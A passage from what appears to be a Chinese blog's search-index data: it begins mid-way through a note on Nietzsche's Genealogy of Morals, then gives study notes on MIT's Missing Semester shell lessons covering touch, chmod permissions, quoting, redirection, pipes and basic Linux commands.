“养肥” 我们的怜悯之情，到我们受苦的时候，想要痛苦发泄的本性就变得难以压制了：\n尽管柏拉图在这里主要是想表示，诗歌所包含的欲望与情感与他理想中的理性与秩序相抵触，会腐蚀个人的品性，以至于摧毁理性，但我们也可以看出，他在这里也暗自蕴含了对同情之心的驳斥。\n而同时，人们往往事先给道德价值予以无条件的肯定，以至于将对此的一切疑问推到 out of question 的境界。人们事先设定好了 “善人” 在价值上高于 “恶人” ，却没有对这种给定的价值评判本身的价值提出质疑。为此尼采特地提出，我们亟需一次对道德价值的批判，道德的价值本身首先是有待质问的：倘若现在的道德评判与事实真相相悖呢？倘若我们的 “善” 在短期内让人活得更加惬意安全，却正在长期内杀死我们呢？倘若道德让我们不能够达到人本能达到的强大境界， “以至于恰恰道德才是那些危险的危险之处呢？……”\n尼采在本书中想要构建的道德谱系学便这样开始了，在 gut und böse, gut und schlecht 的辨析中拉开了他的大幕。\n","date":"2023-11-22T04:12:07+08:00","image":"https://s2.loli.net/2023/11/22/qnB4xvspbQUEVaN.png","permalink":"https://nepl1t.github.io/p/%E8%AE%BA%E9%81%93%E5%BE%B7%E7%9A%84%E8%B0%B1%E7%B3%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-01/","title":"《论道德的谱系》读书笔记 01"},{"content":" 1 本文配置环境为 Ubuntu Linux 22.04.2 LTS 正文 本课程需要使用类Unix shell，例如 Bash 或 ZSH。如果您在 Linux 或者 MacOS 上面完成本课程的练习，则不需要做任何特殊的操作。如果您使用的是 Windows，则您不应该使用 cmd 或是 Powershell；您可以使用Windows Subsystem for Linux或者是 Linux 虚拟机。使用echo $SHELL命令可以查看您的 shell 是否满足要求。如果打印结果为/bin/bash或/usr/bin/zsh则是可以的。 在 /tmp 下新建一个名为 missing 的文件夹。 用 man 查看程序 touch 的使用手册 touch命令 touch 的使用手册分解如下：\n1 2 3 4 5 6 7 8 9 10 11 TOUCH(1) User Commands TOUCH(1) NAME touch - change file timestamps SYNOPSIS touch [OPTION]... FILE... DESCRIPTION Update the access and modification times of each FILE to the current time. touch 程序的用途是，其基本语法是 touch [OPTION]... FILE... ，可以将 FILE 文件的访问时间、修改时间改成当前系统时间。\n1 2 3 4 5 6 7 8 A FILE argument that does not exist is created empty, unless -c or -h is supplied. A FILE argument string of - is handled specially and causes touch to change the times of the file associated with standard output. Mandatory arguments to long options are mandatory for short options too. 如果指定的 FILE 文件并不存在，程序将会创建一个新的 FILE 文件，除非 [OPTION] 中使用了 -c -h 等参数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 -a change only the access time -c, --no-create do not create any files -d, --date=STRING parse STRING and use it instead of current time -f (ignored) -h, --no-dereference affect each symbolic link instead of any referenced file (useful only on systems that can change the timestamps of a symlink) -m change only the modification time -r, --reference=FILE use this file\u0026#39;s times instead of current time -t STAMP use [[CC]YY]MMDDhhmm[.ss] instead of current time --time=WORD change the specified time: WORD is access, atime, or use: equiv‐ alent to -a WORD is modify or mtime: equivalent to -m --help display this help and exit --version output version information and exit Note that the -d and -t options accept different time-date formats. DATE STRING The --date=STRING is a mostly free format human readable date string such as \u0026#34;Sun, 29 Feb 2004 16:21:42 -0800\u0026#34; or \u0026#34;2004-02-29 16:21:42\u0026#34; or even \u0026#34;next Thursday\u0026#34;. A date string may contain items indicating cal‐ endar date, time of day, time zone, day of week, relative time, rela‐ tive date, and numbers. An empty string indicates the beginning of the day. The date string format is more complex than is easily documented here but is fully described in the info documentation. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 AUTHOR Written by Paul Rubin, Arnold Robbins, Jim Kingdon, David MacKenzie, and Randy Smith. REPORTING BUGS GNU coreutils online help: \u0026lt;https://www.gnu.org/software/coreutils/\u0026gt; Report any translation bugs to \u0026lt;https://translationproject.org/team/\u0026gt; COPYRIGHT Copyright © 2022 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. SEE ALSO Full documentation \u0026lt;https://www.gnu.org/software/coreutils/touch\u0026gt; or available locally via: info \u0026#39;(coreutils) touch invocation\u0026#39; GNU coreutils 9.1 January 2023 TOUCH(1) 这一栏则列出了 touch 程序的作者、反馈方式、版权信息等其他信息。\n用 touch 在 missing 文件夹中新建一个叫 semester 的文件。 以上步骤运行如图\n将以下内容一行一行地写入 semester 文件： 1 2 #!/bin/sh curl --head --silent https://missing.csail.mit.edu 由图我们可以看到，直接写入的命令似乎没有作用，而双引号包括住要写入的第一行会让 shell 报错。\n只有命令 echo ‘#!/bin/sh’ \u0026gt; semester 起到了作用。因为 # 在Bash中表示注释，而 ! 即使被双引号（\u0026quot;）包裹也具有特殊的含义。 单引号（\u0026rsquo;）则不一样，此处利用这一点解决输入问题。（更多信息请参考 Bash quoting 手册）\n然后写入第二行命令，注意 \u0026gt; 的重定义效果是直接覆写，而 \u0026gt;\u0026gt; 才是追加内容：\n注意到指令 echo 'curl --head --silent https://missing.csail.mit.edu' \u0026gt; semester 直接将 semester 文件的内容从 #!bin/sh 覆写成了 curl --head --silent https://missing.csail.mit.edu\n而 将 \u0026gt; 改为 \u0026gt;\u0026gt; 才可以另起一行并追加内容\n尝试执行这个文件。例如，将该脚本的路径（./semester）输入到您的shell中并回车。如果程序无法执行，请使用 ls 命令来获取信息并理解其不能执行的原因。 -rw-rw-r-- 告诉我们作为一个文件，我作为创建者（neplit）是只有读取和写入的权限，但没有运行权限。因此我们运行指令 ./semester 是会报 access denied 的。\n同时这也告诉我们 touch 指令创建的文件是不会给我们执行权限的，我们只有读取和写入权限。\n查看 chmod 的手册(例如，使用 man chmod 命令) chmod命令 chmod 的使用手册分解如下：\n1 2 NAME chmod - change file mode bits 其表明 chmod 命令用于修改文件的权限模式。\nLinux/Unix 系统的文件调用权限分为三级：文件所有者、用户组与其他用户（这里上课笔记中有）\n1 2 3 4 5 6 7 8 9 SYNOPSIS chmod [OPTION]... MODE[,MODE]... FILE... chmod [OPTION]... OCTAL-MODE FILE... chmod [OPTION]... --reference=RFILE FILE... DESCRIPTION This manual page documents the GNU version of chmod. chmod changes the file mode bits of each given file according to mode, which can be either a symbolic representation of changes to make, or an octal number representing the bit pattern for the new mode bits. chmod 命令的基本语法是 chmod [OPTION] MODE[,MODE] FILE 。其中的 MODE 是该命令用于更改文件权限的依据（chmod changes the file mode bits of each given file according to mode），其可以使用符号表示（Symbolic representation）或者八进制数表示（an octal number representing the bit pattern for the new mode bits）。\n1 2 3 The format of a symbolic mode is [ugoa...][[-+=][perms...]...], where perms is either zero or more letters from the set rwxXst, or a single letter from the set ugo. Multiple sym‐ bolic modes can be given, separated by commas. 符号表示 的基本格式是 [ugoa...][[-+=][perms...]...]\n如果要同时根据多个符号表示来修改文件权限，不同的符号表示之间可以用逗号分隔开，如下面的指令将两个符号表示 u+r 与 go-r分开来：\n1 chmod u+r,go-r docs 该指令修改了文件 docs 的权限：所有者获得了读取权限，而除所有者外其他用户都失去了读取权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 A combination of the letters ugoa controls which users\u0026#39; access to the file will be changed: the user who owns it (u), other users in the file\u0026#39;s group (g), other users not in the file\u0026#39;s group (o), or all users (a). If none of these are given, the effect is as if (a) were given, but bits that are set in the umask are not affected. The operator + causes the selected file mode bits to be added to the existing file mode bits of each file; - causes them to be removed; and = causes them to be added and causes unmentioned bits to be removed except that a directory\u0026#39;s unmentioned set user and group ID bits are not affected. The letters rwxXst select file mode bits for the affected users: read (r), write (w), exe‐ cute (or search for directories) (x), execute/search only if the file is a directory or already has execute permission for some user (X), set user or group ID on execution (s), restricted deletion flag or sticky bit (t). Instead of one or more of these letters, you can specify exactly one of the letters ugo: the permissions granted to the user who owns the file (u), the permissions granted to other users who are members of the file\u0026#39;s group (g), and the permissions granted to users that are in neither of the two preceding cate‐ gories (o). ugoa 表示要修改的是哪一类用户的文件权限，其中 u 代表 user 文件所有者、 g 代表 group 用户组内成员、o 代表 others 其他用户， 而 a 代表 all 所有用户 。 [ugoa] 的方括号告诉我们这一部分可以省略，而 省略则默认修改所有人的权限 。\n[-+=] 表示要以何种方式修改文件权限。 - 代表删除某权限， + 代表追加某权限 而不影响其他权限， = 代表直接设置成某权限 并删除其他权限。 比如 -r（删除读取权限）、 +w（增加写入权限）、=r（设置成只可读权限，即增加读取权限，删除执行与写入权限）\n[perms] 即 permissions，代表要设置的是什么权限：从 字符集rwxXst 中选择。\nr 代表读取权， w 代表写入权， x 代表执行权。X为特殊执行权限：只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行。\n1 2 3 4 5 6 7 A numeric mode is from one to four octal digits (0-7), derived by adding up the bits with values 4, 2, and 1. Omitted digits are assumed to be leading zeros. The first digit se‐ lects the set user ID (4) and set group ID (2) and restricted deletion or sticky (1) at‐ tributes. The second digit selects permissions for the user who owns the file: read (4), write (2), and execute (1); the third selects permissions for other users in the file\u0026#39;s group, with the same values; and the fourth for other users not in the file\u0026#39;s group, with the same values. 八进制表示是一个三位数。从前到后每一位数都代表了一类用户的文件权限（分别是u、g、o）。数值的确定规则如下：首先将三个不同的权限变成三个数值：4-r, 2-w, x-1。比如 rwx 代表 4+3+1=7, 其八进制表示则是7。r-x 代表 4+0+1=5， \u0026mdash; 代表 0+0+0=0。那么数值 750 就代表了 所有者拥有读取写入执行权、用户组用户拥有读取和执行权，其他用户没有任何权利。\n使用八进制表示来使用 chmod 命令的语法为：\n1 chmod abc file 其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。\nr=4，w=2，x=1\n若要 rwx 属性则 4+2+1=7；\n若要 rw- 属性则 4+2=6；\n若要 r-x 属性则 4+1=5。\n例如\n1 2 3 chmod a=rwx file chmod =rwx file chmod 777 file 效果相同，都是将 file 的权限都设为 rwxrwxrwx 。\n1 2 chmod ug=rwx,o=x file chmod 771 file 效果相同，都是将 file 的权限设置为 rwxrwx--x。\n1 2 3 4 5 chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions. This is not a problem since the permissions of symbolic links are never used. However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file. In contrast, chmod ignores symbolic links encountered during recursive directory traversals. 使用 chmod 命令改变权限，使 ./semester 能够成功执行，不要使用 sh semester 来执行该程序。（您的 shell 是如何知晓这个文件需要使用 sh 来解析呢？更多信息请参考：shebang ） 使用 | 和 \u0026gt; ，将 semester 文件输出的最后更改日期信息，写入主目录下的 last-modified.txt 的文件中 semester 文件输出的最后更改日期信息（last-modified） 可以利用 grep 命令寻找。\n写一段命令来从 /sys 中获取笔记本的电量信息，或者台式机 CPU 的温度。注意：macOS 并没有 sysfs，所以 Mac 用户可以跳过这一题。 solution：\n创建一个文件名为 now_battery_capa，其内容为 cat /sys/class/power_supply/BAT1/capacity 。 将其权限设为可执行 可以看出现在笔记本电量为100.\n","date":"2023-11-03T22:15:08+08:00","permalink":"https://nepl1t.github.io/p/mitms01a_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/","title":"MITMS01a_课程概述与Shell"},{"content":" 1 本文配置环境为 Windows 11 64位下的 Git Bash 界面介绍，date echo pwd which 命令，文件路径 打开终端如下图\n其告诉你：你的用户名为Azusaislit，主机名为Roboride-Portab\n运行 date 程序，显示出当前时间\n可以在执行运行程序的命令的同时传递参数，比如运行 echo 程序的同时传递参数 Hello，这将会在你的终端输出 Hello\n如果希望传递的参数中包含空格（例如一个名为 My Photos 的文件夹），您要么用使用单引号'My Photos'，双引号将其包裹起来 \u0026quot;My Photos\u0026quot; ，要么使用转义符号 \\ 进行处理（My\\ Photos）。\n环境变量 是 shell 确定程序位置的一个基本方法，它就像编程语言的一种变量（实际上 shell 就是一种编程语言，可以用来编程，后面可以来写脚本）。它是在启动 shell 的时候就已经设置好了的，不需要用户每次手动配置\n路径变量 $PATH 是一类重要的环境变量：如果你要求 shell 执行某个指令，但是该指令并不是 shell 所了解的编程关键字，那么它会去咨询 环境变量 $PATH，其会列出当 shell 接到某条指令时，进行程序搜索的路径\n这是由冒号所分割的路径列表。电脑在$PATH寻找并尝试匹配你所需要的程序。\n运行程序可以直接输入程序名称，让 shell 从 $PATH 中寻找它，或者通过程序的绝对路径来运行\n绝对路径是完全可以确定文件位置的路径\n相对路径是相对你所在路径的路径。利用 pwd 命令可以查看当前所在的路径\n其告诉我我正位于 C:\\Users\\Azusaislit 文件夹中（我目前使用Windows系统下的Bash shell）\n而切换目录需要使用 cd 命令。在路径中，. 表示的是当前目录，而 .. 表示上级目录\n如果我们想知道所运行的程序是哪一个，我们可使用 which 命令\n即运行的 echo 程序位于 /usr/bin/echo\n在Windows上，每个分区都有一个根目录，每个分区都有一个单独的路径结构： C:\\ D:\\，而这样的路径用反斜杠分割\n在Linux和MacOS，所有内容都属于根命名空间内，所有绝对路径都由 / 开头，路径用正斜杠分割。\nls命令与文件权限 为了查看指定目录下包含哪些文件，我们使用 ls 命令：\n这告诉我们 C:\\Users\\Azusaislit\\Pictures 路径下的所有文件夹（蓝色字体）与文件（白色字体） 使用 ls -l 命令会给我们有关这些文件夹与文件的更多信息\n在某些条目的开头的 \u0026ldquo;d\u0026rdquo; 表示这些条目是一个目录，因此我们可知道 'Camera Roll' 条目 是一个目录，而 desktop.ini 是一个文件。 之后的9个字母表示该文件或目录的权限：有 \u0026ldquo;r\u0026rdquo; 意思是读取权限，有 \u0026ldquo;w\u0026rdquo; 意思是写入权限，有 \u0026ldquo;x\u0026rdquo; 意思是执行权限。\n如 r-x 意思是你拥有读取与执行权限，但没有写入权限。 而对目录来说，这些权限含义\n读取 -\u0026gt; 查看目录的文件列表 写入 -\u0026gt; 在目录中创造、重命名、删除文件。 （如果你有文件 /usr/bin/programA/config.yoml 的写入权限，但没有目录 /usr/bin/programA 的写入权限，这意味着你可以对 该yoml本身内容进行操作，却不能重命名它、或者删除它） 执行 -\u0026gt; \u0026ldquo;搜索\u0026quot;权限，是否允许进入该目录。如果你要进入一个目录，你需要在 该目录及其所有的直系父目录上 都拥有执行权限 前三个字符是为文件所有者（这里是Azusaislit）所设置的权限 中间三个字符是为拥有该文件的组设置的权限 最后三个字符是其他人的权限列表\n对于 cd 命令有两个特殊符号较常用：\ncd ~ 将切换到主目录（不是根目录） cd - 将切换到你之前所在的目录 如图，通过 cd - 我们实现了在 ~/pictures 与 ~ 之间相互切换\nmv cp rm mkdir man 指令 mv 命令可以 移动文件 ，也可以 重命名文件\n利用 mv 命令将当前所在路径下的一个 broke.txt 重命名为 up.txt\n利用 mv 命令将位于 D:\\ST2 的 hello.txt 转移到 D:\\Shell_test 目录\n同样 重命名 和 移动 操作 可以同时进行\n还有 cp 命令可用于复制文件，用法类似 mv ，也可以用来重命名文件\nrm 命令可以用来删除文件，但在Linux上删除不会递归进行，因此不能用于删除目录。通常使用 rm -r 或者 rmdir 命令用于删除目录，但后者只能删除空目录。\nmkdir 命令用于创建目录。如果你要创建一个名为 My Photo 的目录，您要么用使用单引号'My Photos'，双引号将其包裹起来 \u0026quot;My Photos\u0026quot; ，要么使用转义符号 \\ 进行处理（My\\ Photos）。\nman 程序以另一个程序作为参数，并给出作为参数的程序的 manual pages。这比 \u0026ndash;help 指令通常更为实用。（Windows的bash不可用）\nCtrl + L 是 cls (Windows cmd) 或 clear (Bash Shell) 的快捷键\nIO重定向 在 shell 中，程序有两个主要的“流”：它们的输入流和输出流。 当程序尝试读取信息时，它们会从输入流中进行读取，当程序打印信息时，它们会将信息输出到输出流中。 通常，一个程序的输入输出流都是您的终端。也就是，您的键盘作为输入，显示器作为输出。 但是，我们也可以重定向这些流！\n最简单的重定向是 \u0026lt; file ：表示将要运行的程序的输入重定向为 file 文件的内容（file 代替输入） 和 \u0026gt; file ：表示将程序的输出重定向到 file 文件中（将 file 用于输出结果）\ncat 命令的作用是打印文件的内容。我们可以看到 echo 命令的结果被写入到 hello.txt 中了。\n利用 cat 命令也重定向输入输出：从 hello.txt 读取内容，并输出在 hate.txt 中。最后一个 cat 命令中输出没有重定向，其内容默认输出在终端上。\n| 操作符允许我们将一个程序的输出和另外一个程序的输入连接起来: A | B 即将 A 程序的输出作为 B程序的输入。| 的使用可以嵌套。 `` tail\nsudo su 将终端切换到 ROOT终端\ntee\n1 echo 1060 | sudo tee brightness 或者\n1 2 sudo su echi 1060 \u0026gt; brightness find 文件\nxdg-open file 命令可以用合适的程序打开 file 文件。\n","date":"2023-11-02T16:43:23+08:00","permalink":"https://nepl1t.github.io/p/mitms01_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/","title":"MITMS01_课程概述与Shell"}]